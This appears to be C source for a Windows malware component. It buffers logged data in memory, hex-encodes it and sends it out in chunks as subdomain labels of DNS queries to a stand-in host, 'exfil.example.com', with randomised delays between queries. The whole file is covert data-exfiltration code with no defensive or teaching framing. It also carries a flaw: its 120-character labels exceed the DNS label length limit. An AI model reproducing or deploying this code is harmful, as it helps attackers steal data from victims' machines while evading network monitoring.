#include <windows.h>
#include <shlobj.h>
#include <stdio.h>
#include <string.h>
#include <windns.h>
#include <wincrypt.h>

#pragma comment(lib, "dnsapi.lib")
#pragma comment(lib, "crypt32.lib")

// Memory logging buffer
char logBuffer[4096];
int logIndex = 0;

// Log to memory
void mem_log(const char *data) {
    size_t len = strlen(data);
    if (logIndex + len < sizeof(logBuffer)) {
        memcpy(&logBuffer[logIndex], data, len);
        logIndex += len;
    }
}

void hex_enc(const unsigned char *in, size_t len, char *out) {
    const char *hex = "0123456789abcdef";
    for (size_t i = 0; i < len; i++) {
        out[i * 2] = hex[in[i] >> 4];
        out[i * 2 + 1] = hex[in[i] & 0xF];
    }
    out[len * 2] = '\0';
}

void dns_exfil(const char *hexdata, const char *domain) {
    char fullQuery[256];
    static int counter = 0;

    snprintf(fullQuery, sizeof(fullQuery), "%02x.%s.%s", counter++, hexdata, domain);

    DNS_RECORD *record;
    DnsQuery_A(fullQuery, DNS_TYPE_A, DNS_QUERY_STANDARD, 0, &record, 0);
    if (record) DnsRecordListFree(record, DnsFreeRecordList);
}

// Send memory contents over DNS
void actual_exfil() {
    char hex[128]; // 60 bytes -> 120 hex chars + null
    size_t chunk_size = 60;

    for (size_t i = 0; i < logIndex; i += chunk_size) {
        size_t len = (i + chunk_size < logIndex) ? chunk_size : (logIndex - i);
        hex_enc((unsigned char*)&logBuffer[i], len, hex);
        dns_exfil(hex, "exfil.example.com");
        Sleep(100 + (rand() % 30));
    }
}
